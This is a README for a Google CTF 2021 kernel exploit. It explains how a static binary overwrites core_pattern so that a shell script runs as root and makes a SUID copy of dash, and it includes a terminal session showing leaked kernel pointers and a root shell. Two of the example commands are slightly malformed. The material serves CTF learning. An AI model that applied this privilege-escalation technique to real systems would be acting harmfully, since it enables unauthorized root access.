This directory contains the relevant source-code files used to exploit the vulnerable kernel module in the Google CTF 2021 Full chain challenge.

[exploit-core-pattern.c](exploit-core-pattern.c) should be compiled as a static binary and written to the target and executed from a user-privileged shell to elevate privileges. It will overwrite the core_pattern string to execute the [exploit.sh](exploit.sh) shell-script located on the target at the path `/tmp/userdata/x`.

The shell-script will create a SUID copy of `/bin/dash` which can be executed with `/tmp/userdata/dash -p` to obtain a root-privileged shell.

**Example Usage**
```bash
ctf@(none):/$ echo '#!/bin/bash' /tmp/userdata/x
ctf@(none):/$ echo 'install -m =xs $(which dash) /tmp/userdata' >> /tmp/userdata/
ctf@(none):/$ chmod +x /tmp/userdata/x
ctf@(none):/$ cat /tmp/userdata/x
#!/bin/bash
install -m =xs $(which dash) /tmp/userdata
ctf@(none):/$ ulimit -c unlimited # enable core-dumps
ctf@(none):/$ ulimit -c
unlimited
ctf@(none):/$ /exp
[+] Spraying pool
[+] Opening /dev/ctf
[+] CTF_ALLOC 696 
[+] READ 696
...
magic: 5401
Leaked text pointer: 0xffffffff8aa745e0
Leaked data pointer: 0xffffa0d482671038
base: ffffffff89a00000
[+] WRITE 696
[+] OVERWRITING CORE_PATTERN
[+] BYEE
[+] CRASHING
ctf@(none):/$ ls -l /tmp/userdata/
total 128
---s--s--x 1 root root 125560 Nov 11 16:15 dash
-rwxr-xr-x 1 ctf  ctf      55 Nov 11 16:13 x
ctf@(none):/$ /tmp/userdata/dash -p
/tmp/userdata/dash: 0: can't access tty; job control turned off
# whoami
root 
```
